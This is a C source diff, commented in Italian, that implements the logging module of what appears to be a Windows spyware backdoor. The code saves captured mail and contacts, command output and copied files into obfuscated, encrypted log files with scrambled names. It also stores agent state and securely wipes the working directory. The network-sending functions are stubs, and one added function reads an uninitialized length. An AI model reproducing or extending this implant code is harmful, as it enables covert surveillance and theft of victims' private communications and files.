@@ -54,7 +54,7 @@ typedef struct _LogStruct{
 log_entry_struct log_table[MAX_LOG_ENTRIES];
 
 // Dichiarato in SM_EventHandlers.h
-// extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
+extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 extern BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line);
 
 // Dichiarato in SM_ActionFunctions.h
@@ -99,6 +99,7 @@ DWORD GetLogSize(char *path)
 BOOL InsertLogList(log_list_struct **log_list, WIN32_FIND_DATA *log_elem)
 {
 
+	
 	return TRUE;
 }
 
@@ -602,45 +603,266 @@ char *LOG_ScrambleName2(char *string, BYTE scramble, BOOL crypt)
 // Crea un file di log col nuovo formato
 HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional_len)
 {
+	char log_wout_path[128];
+	char file_name[DLLNAMELEN];
+	char *scrambled_name;
+	FILETIME time_nanosec;
+	DWORD out_len, dummy;
+	BYTE *log_header;
+	HANDLE hfile;
+#define MAX_FILE_RETRY_COUNT 20
+	DWORD retry_count = 0;
 
-	return 0;
+	// Controlla che ci sia ancora spazio per scrivere su disco
+	// (additional_len e' l'unica parte di lunghezza variabile dell'header)
+	if (log_free_space <= MIN_CREATION_SPACE + additional_len) 
+		return INVALID_HANDLE_VALUE;
+
+	// Usa l'epoch per dare un nome univoco al file
+	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	
+
+	// Fa piu' tentativi ogni volta cambiando il nome del file
+	// data la scarsa granularita' del systemtime
+	do {
+		retry_count++;
+		if (retry_count > MAX_FILE_RETRY_COUNT)
+			return INVALID_HANDLE_VALUE;
+
+		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%.8X%.8X.log", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
+			return INVALID_HANDLE_VALUE;	
+		HM_CompletePath(scrambled_name, file_name);
+		SAFE_FREE(scrambled_name);
+
+		hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 
+
+		// Incrementa di 1 il timestamp se deve riprovare
+		time_nanosec.dwLowDateTime++;
+		if (time_nanosec.dwLowDateTime == 0) // il riporto
+			time_nanosec.dwHighDateTime++;
+	} while (hfile == INVALID_HANDLE_VALUE);
+
+	// Scrive l'header nel file
+	log_header = Log_CreateHeader(agent_tag, additional_header, additional_len, &out_len);
+	if (!log_header || log_free_space<out_len || !FNC(WriteFile)(hfile, log_header, out_len, &dummy, NULL)) {
+		SAFE_FREE(log_header);
+		CloseHandle(hfile);
+		FNC(DeleteFileA)(file_name);
+		return INVALID_HANDLE_VALUE;
+	}
+	SAFE_FREE(log_header);
+	// ...e sottrae dalla quota disco
+	if (log_free_space >= out_len)
+		log_free_space -= out_len;
+	FNC(FlushFileBuffers)(hfile);
+
+	return hfile;
+}
+HANDLE Log_CreateFile2(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BOOL is_incoming)
+{
+	char log_wout_path[128];
+	char file_name[DLLNAMELEN];
+	char *scrambled_name;
+	FILETIME time_nanosec;
+	DWORD out_len, dummy;
+	BYTE *log_header;
+	HANDLE hfile;
+#define MAX_FILE_RETRY_COUNT 20
+	DWORD retry_count = 0;
+
+	char szLogFileNameFormat[256] = {0};
+	if (PM_CONTACTSAGENT == agent_tag){
+		strcat(szLogFileNameFormat, "%s\\");//add sub path for mail contacts dir
+		strcat(szLogFileNameFormat, "contacts_");//add sub path for mail contacts dir
+		strcat(szLogFileNameFormat, "%.1XLOGF%.4X%.8X%.8X.log");
+	}else if(PM_MAILAGENT == agent_tag)
+	{
+		strcat(szLogFileNameFormat, "%s\\");//add sub path for mail save dir
+		if (is_incoming)
+			strcat(szLogFileNameFormat, "mail_in_");
+		else
+			strcat(szLogFileNameFormat, "mail_out_");
+		strcat(szLogFileNameFormat, "%.1XLOGF%.4X%.8X%.8X.eml");
+	}
+
+	if (log_free_space <= MIN_CREATION_SPACE + additional_len)
+		return INVALID_HANDLE_VALUE;
+
+	FNC(GetSystemTimeAsFileTime)(&time_nanosec);
+
+	do {
+		retry_count++;
+		if (retry_count > MAX_FILE_RETRY_COUNT)
+			return INVALID_HANDLE_VALUE;
+
+		if (PM_CONTACTSAGENT == agent_tag || PM_MAILAGENT == agent_tag)//add sub path for mail save dir
+			_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, szLogFileNameFormat,"data", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+		else
+			_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, szLogFileNameFormat, log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+
+		HM_CompletePath(log_wout_path, file_name);
+
+		hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+
+		time_nanosec.dwLowDateTime++;
+		if (time_nanosec.dwLowDateTime == 0) 
+			time_nanosec.dwHighDateTime++;
+	} while (hfile == INVALID_HANDLE_VALUE);
+
+
+	if (log_free_space >= out_len)
+		log_free_space -= out_len;
+	FNC(FlushFileBuffers)(hfile);
+
+	return hfile;
 }
 
 // Usato per l'output dei comandi
 // N.B. Non sottrae quota disco!
 HANDLE Log_CreateOutputFile(char *command_name)
 {
+	char log_wout_path[128];
+	char file_name[DLLNAMELEN];
+	char *scrambled_name;
+	FILETIME time_nanosec;
+	DWORD out_len, dummy;
+	BYTE *log_header;
+	HANDLE hfile;
+	SECURITY_ATTRIBUTES sa;
 
+	// Controlla che ci sia ancora spazio per scrivere su disco
+	if (log_free_space <= MIN_CREATION_SPACE) 
+		return INVALID_HANDLE_VALUE;
 
-	return 0;
+	// Usa l'epoch per dare un nome univoco al file
+	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	
+
+	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "OUTF%.8X%.8X.log", time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+	if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
+		return INVALID_HANDLE_VALUE;	
+	HM_CompletePath(scrambled_name, file_name);
+	SAFE_FREE(scrambled_name);
+
+	sa.bInheritHandle = TRUE;
+	sa.nLength = 0;
+	sa.lpSecurityDescriptor = NULL;
+	hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ, &sa, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 
+	if (hfile == INVALID_HANDLE_VALUE)
+		return INVALID_HANDLE_VALUE;
+
+	// Scrive l'header nel file
+	log_header = Log_CreateHeader(PM_COMMANDEXEC, (BYTE *)command_name, strlen(command_name) + 1, &out_len);
+	if (!log_header || log_free_space<out_len || !FNC(WriteFile)(hfile, log_header, out_len, &dummy, NULL)) {
+		SAFE_FREE(log_header);
+		CloseHandle(hfile);
+		FNC(DeleteFileA)(file_name);
+		return INVALID_HANDLE_VALUE;
+	}
+	SAFE_FREE(log_header);
+	FNC(FlushFileBuffers)(hfile);
+
+	return hfile;
 }
 
 
 // Chiude un file di log
 void Log_CloseFile(HANDLE handle)
 {
-
+	if (handle != INVALID_HANDLE_VALUE)
+		CloseHandle(handle);
 }
-
+void Log_CloseFile2(HANDLE handle)
+{
+	if (handle != INVALID_HANDLE_VALUE)
+		CloseHandle(handle);
+}
 
 // Cancella tutti i file di log
 void Log_RemoveFiles()
 {
+	char log_file[DLLNAMELEN];
+	WIN32_FIND_DATA FindFileData;
+	char DirSpec[MAX_PATH];  
+	HANDLE hFind = INVALID_HANDLE_VALUE;
 
+	// Cerca tutti i file nella directory di lavoro tranne
+	// il core e il file di configurazione
+	HM_CompletePath("*", DirSpec);
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			// Salta le directory (es: ".", ".." etc...)
+			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+				continue;
+
+			// Cancella i file che non sono il core o il file di conf
+			if (stricmp(FindFileData.cFileName, H4DLLNAME) && stricmp(FindFileData.cFileName, H4_CONF_FILE))
+				HM_WipeFileA(HM_CompletePath(FindFileData.cFileName, log_file));
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
 }
 
 
 // Salva lo stato di un agente
 BOOL Log_SaveAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
 {
+	char conf_name[128];
+	char conf_path[DLLNAMELEN];
+	char *scrambled_name;
+	HANDLE hf;
+	DWORD dwWrt = 0;
 
+	// Il formato del nome e' ACFG<agent>.bin
+	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
+	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
+		return FALSE;
+	
+	HM_CompletePath(scrambled_name, conf_path);
+	SAFE_FREE(scrambled_name);
+
+	hf = FNC(CreateFileA)(conf_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
+	if (hf == INVALID_HANDLE_VALUE)
+		return FALSE;
+
+	// Verifica che abbia scritto tutto
+	if (!FNC(WriteFile)(hf, conf_buf, conf_len, &dwWrt,  NULL) || dwWrt!=conf_len) {
+		CloseHandle(hf);
+		return FALSE;
+	}
+
+	CloseHandle(hf);
 	return TRUE;
 }
 
 // Carica lo stato di un agente
 BOOL Log_RestoreAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
 {
+	char conf_name[128];
+	char conf_path[DLLNAMELEN];
+	char *scrambled_name;
+	HANDLE hf;
+	DWORD dwRd = 0;
 
+	// Il formato del nome e' ACFG<agent>.bin
+	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
+	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
+		return FALSE;
+	
+	HM_CompletePath(scrambled_name, conf_path);
+	SAFE_FREE(scrambled_name);
+
+	hf = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
+	if (hf == INVALID_HANDLE_VALUE)
+		return FALSE;
+
+	// Verifica che abbia scritto tutto
+	if (!FNC(ReadFile)(hf, conf_buf, conf_len, &dwRd,  NULL) || dwRd!=conf_len) {
+		CloseHandle(hf);
+		return FALSE;
+	}
+
+	CloseHandle(hf);
 	return TRUE;
 }
 
@@ -651,7 +873,103 @@ BOOL Log_RestoreAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
 #define CRYPT_COPY_BUF_LEN 102400
 BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD agent_tag)
 {
+	HANDLE hsrc, hdst;
+	BY_HANDLE_FILE_INFORMATION dst_info;
+	DWORD existent_file_size = 0;
+	DWORD dwRead;
+	BYTE *temp_buff;
+	BYTE *file_additional_data;
+	BYTE *log_file_header;
+	FileAdditionalData *file_additiona_data_header;
+	DWORD header_len;
+	WCHAR *to_display;
 
+	if (display_name)
+		to_display = display_name;
+	else
+		to_display = src_path;
+
+	// Crea l'header da scrivere nel file
+	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
+		return FALSE;
+	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
+	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
+	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
+	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
+	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
+	SAFE_FREE(file_additional_data);
+	if (!log_file_header)
+		return FALSE;
+	
+
+	// Prende le info del file destinazione (se esiste)
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hdst != INVALID_HANDLE_VALUE) {
+		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
+			existent_file_size = dst_info.nFileSizeLow;
+		}
+		CloseHandle(hdst);
+	}
+
+	if ( !(temp_buff = (BYTE *)malloc(CRYPT_COPY_BUF_LEN)) ) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+
+	hsrc = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hsrc == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(log_file_header);
+		SAFE_FREE(temp_buff);
+		return FALSE;
+	}
+
+	// Controlla che ci sia ancora spazio per scrivere su disco
+	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
+		SAFE_FREE(temp_buff);
+		SAFE_FREE(log_file_header);
+		CloseHandle(hsrc);
+		return FALSE;
+	}
+
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
+	if (hdst == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(log_file_header);
+		SAFE_FREE(temp_buff);
+		CloseHandle(hsrc);
+		return FALSE;
+	}
+	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
+	// recuperata.
+	log_free_space += existent_file_size;
+
+	// Scrive l'header nel file
+	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
+		CloseHandle(hsrc);
+		CloseHandle(hdst);
+		SAFE_FREE(log_file_header);
+		SAFE_FREE(temp_buff);
+		return FALSE;
+	}
+	if (log_free_space >= header_len)
+		log_free_space -= header_len;
+	SAFE_FREE(log_file_header);
+	FNC(FlushFileBuffers)(hdst);
+
+	// Cicla finche riesce a leggere (e/o a scrivere)
+	LOOP {
+		dwRead = 0;
+		if (!FNC(ReadFile)(hsrc, temp_buff, CRYPT_COPY_BUF_LEN, &dwRead, NULL) )
+			break;
+		// La Log_WriteFile sottrae la quota disco di ogni scrittura
+		// Esce perche' quando il file da leggere e' finito dwRead e' 0
+		// e Log_WriteFile ritorna FALSE se gli fai scrivere 0 byte
+		if (!Log_WriteFile(hdst, temp_buff, dwRead))
+			break;
+	}
+
+	SAFE_FREE(temp_buff);
+	CloseHandle(hsrc);
+	CloseHandle(hdst);
 	return TRUE;
 }
 
@@ -659,7 +977,69 @@ BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_nam
 // Specifica la size nel nome del file stesso
 BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD existent_file_len, DWORD agent_tag)
 {
+	HANDLE hdst;
+	DWORD dwRead;
+	BY_HANDLE_FILE_INFORMATION dst_info;
+	DWORD existent_file_size = 0;
+	BYTE *file_additional_data;
+	BYTE *log_file_header;
+	FileAdditionalData *file_additiona_data_header;
+	DWORD header_len;
+	WCHAR to_display[MAX_PATH];
 
+	if (display_name) 
+		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", display_name, existent_file_len);		
+	else
+		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", src_path, existent_file_len);		
+
+	// Crea l'header da scrivere nel file
+	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
+		return FALSE;
+	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
+	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
+	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
+	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
+	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
+	SAFE_FREE(file_additional_data);
+	if (!log_file_header)
+		return FALSE;
+	
+	// Prende le info del file destinazione (se esiste)
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hdst != INVALID_HANDLE_VALUE) {
+		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
+			existent_file_size = dst_info.nFileSizeLow;
+		}
+		CloseHandle(hdst);
+	}
+
+	// Controlla che ci sia ancora spazio per scrivere su disco
+	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
+	if (hdst == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
+	// recuperata.
+	log_free_space += existent_file_size;
+
+	// Scrive l'header nel file
+	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
+		CloseHandle(hdst);
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+	if (log_free_space >= header_len)
+		log_free_space -= header_len;
+
+	SAFE_FREE(log_file_header);
+	FNC(FlushFileBuffers)(hdst);
+	CloseHandle(hdst);
 	return TRUE;
 }
 
@@ -680,11 +1060,66 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 // E' conforme al nuovo formato di log (lunghezza in cleartext + blocco cifrato)
 BOOL Log_WriteFile(HANDLE handle, BYTE *clear_buffer, DWORD clear_len)
 {
+	DWORD dwTmp;
+	BOOL ret_val;
+	DWORD crypt_len = 0;
+	BYTE *crypt_buffer = NULL;
 
+	// Controlla che la richiesta sia valida
+	if (handle == INVALID_HANDLE_VALUE || clear_len == 0 || clear_buffer == NULL)
+		return FALSE;
 
-	return 0;
+	// Offusca il buffer. La funzione torna una copia del buffer
+	// gia' offuscata, e la dimensione di essa. La copia va
+	// liberata (se e' stata allocata).
+	crypt_buffer = LOG_Obfuscate(clear_buffer, clear_len, &crypt_len);
+
+	// Controlla lo spazio disco rimasto e che la cifratura
+	// sia andata a buon fine
+	if (!crypt_buffer || crypt_len > log_free_space) {
+		SAFE_FREE(crypt_buffer);
+		return FALSE;
+	}
+
+	ret_val = FNC(WriteFile)(handle, crypt_buffer, crypt_len, &dwTmp,  NULL);
+	SAFE_FREE(crypt_buffer);
+
+	// Se ha scritto con successo, diminuisce lo spazio residuo
+	// XXX Potrebbe esserci una race condition e log_free_space 
+	// diventerebbe enorme...(abbastanza remoto)
+	// Col doppio check diminuisco le possiblita' di race 
+	// condition ulteriormente.
+	if (ret_val && crypt_len<=log_free_space)
+		log_free_space -= crypt_len;
+
+	// Cancellata per questioni di performance di skype
+	//FNC(FlushFileBuffers)(handle);
+
+	return ret_val;
 }
+BOOL Log_WriteFile2(HANDLE handle, BYTE *clear_buffer, DWORD clear_len)
+{
+	DWORD dwTmp;
+	BOOL ret_val;
+	DWORD crypt_len = 0;
+	BYTE *crypt_buffer = NULL;
 
+	// Controlla che la richiesta sia valida
+	if (handle == INVALID_HANDLE_VALUE || clear_len == 0 || clear_buffer == NULL)
+		return FALSE;
+
+
+
+	ret_val = FNC(WriteFile)(handle, clear_buffer, clear_len, &dwTmp, NULL);
+
+	if (ret_val && clear_len <= log_free_space)
+		log_free_space -= clear_len;
+
+	// Cancellata per questioni di performance di skype
+	//FNC(FlushFileBuffers)(handle);
+
+	return ret_val;
+}
 
 // Elimina da una stringa tutti i caratteri non 
 // alfanumerici
@@ -702,21 +1137,104 @@ void Log_Sanitize(char *name)
 #define SECS_TO_FT_MULT 10000000
 void LOG_Purge(long long f_time, DWORD size)
 {
-
+	return;
 }
 
 
 // Scambia la coda di log attiva con quella inattiva
 void Log_SwitchQueue()
 {
+	char search_mask[64];
+	char *scrambled_search;
+	char DirSpec[DLLNAMELEN];
+	char DestSpec[DLLNAMELEN];
+	WIN32_FIND_DATA FindFileData;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
 
+	// La coda attiva e' sempre la 0!
+	log_active_queue = 0;
+
+	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
+	scrambled_search = LOG_ScrambleName2(search_mask, crypt_key[0], TRUE);
+	if (!scrambled_search)
+		return;
+
+	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
+	// quindi posso usare le wildcard).
+	HM_CompletePath(scrambled_search, DirSpec);
+	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			HM_CompletePath(FindFileData.cFileName, DirSpec); // Nome File sorgente in DirSpec
+			memcpy(DestSpec, DirSpec, sizeof(DestSpec));
+			scrambled_search = LOG_ScrambleName2("1", crypt_key[0], TRUE);
+			if (!scrambled_search)
+				break;
+
+			char *q = strrchr(DestSpec, '\\');
+			if (q) {
+				q++;
+				*q = scrambled_search[0]; // Nome File destinazione in DestSpec
+				SAFE_FREE(scrambled_search);
+			} else {
+				SAFE_FREE(scrambled_search);
+				break;
+			}
+			MoveFile(DirSpec, DestSpec);					
+
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
+
+	// XXX Cerca di switchare anche i log con il vecchio scrambling
+	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
+	scrambled_search = LOG_ScrambleName(search_mask, crypt_key[0], TRUE);
+	if (!scrambled_search)
+		return;
+
+	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
+	// quindi posso usare le wildcard).
+	HM_CompletePath(scrambled_search, DirSpec);
+	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			HM_CompletePath(FindFileData.cFileName, DirSpec); // Nome File sorgente in DirSpec
+			memcpy(DestSpec, DirSpec, sizeof(DestSpec));
+			scrambled_search = LOG_ScrambleName("1", crypt_key[0], TRUE);
+			if (!scrambled_search)
+				break;
+
+			char *q = strrchr(DestSpec, '\\');
+			if (q) {
+				q++;
+				*q = scrambled_search[0]; // Nome File destinazione in DestSpec
+				SAFE_FREE(scrambled_search);
+			} else {
+				SAFE_FREE(scrambled_search);
+				break;
+			}
+			MoveFile(DirSpec, DestSpec);					
+
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
 }
 
-
+// Funzione esportata per permettere di loggare una bitmap 
+#include "HM_BitmapCommon.h"
+typedef struct _PrintAdditionalData {
+	UINT uVersion;
+		#define LOG_PRINT_VERSION 2009031201
+	UINT uDocumentNameLen;
+} PrintAdditionalData;
 
 void __stdcall Log_PrintDC(WCHAR *doc_name, HDC print_dc, HBITMAP print_bmp, DWORD x_dim, DWORD y_dim)
 {
-
+	return;
 }
 
 
@@ -742,14 +1260,37 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 // Torna dest_path.
 WCHAR *LOG_CompleteWild(WCHAR *wild_path, WCHAR *file_name, WCHAR *dest_path)
 {
+	WCHAR *wild_ptr;
+	
+	dest_path[0] = 0; // Termina per sicurezza paranoica...
+	wcscpy(dest_path, wild_path);
+	wild_ptr = wcsrchr(dest_path, L'\\');
+	// Sostituisce all'ultimo slash
+	if (wild_ptr) {
+		wild_ptr++;
+		wcscpy(wild_ptr, file_name);
+	}
 
-
-	return 0;
+	return dest_path;
 }
 
 void UpdateDriver(char *source_path)
 {
-
+	char sys_path[DLLNAMELEN];
+	char comp_path[DLLNAMELEN*2];
+	PVOID old_value;
+	/*
+	if (!IsDriverRunning(DRIVER_NAME_W))
+		return;
+	
+	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
+		return;
+	sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
+	
+	old_value = DisableWow64Fs();
+	CopyFile(source_path, comp_path, FALSE);	
+	RevertWow64Fs(old_value);*/
+	return;
 }
 
 // I file uploadati vengono messi nella working dir.
@@ -758,12 +1299,15 @@ void UpdateDriver(char *source_path)
 // Gestisce anche gli upgrade
 BOOL LOG_HandleUpload(BOOL is_upload)
 {
+
+
 	return TRUE;
 }
 
 // Gestisce le richieste di download (creando dei log di quel tipo)
 BOOL LOG_HandleDownload()
 {
+
 	return TRUE;
 }
 
@@ -794,6 +1338,7 @@ BOOL LOG_ReceiveNewConf()
 // Se torna FALSE e uninstall==TRUE, si deve disinstallare
 BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall, long long *time_date, DWORD *availables, DWORD size_avail)
 {
+
 	return TRUE;
 }
 
@@ -801,4 +1346,5 @@ BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall
 // Chiude la connessione per l'invio dei log
 void LOG_CloseLogConnection()
 {
+	return;
 }
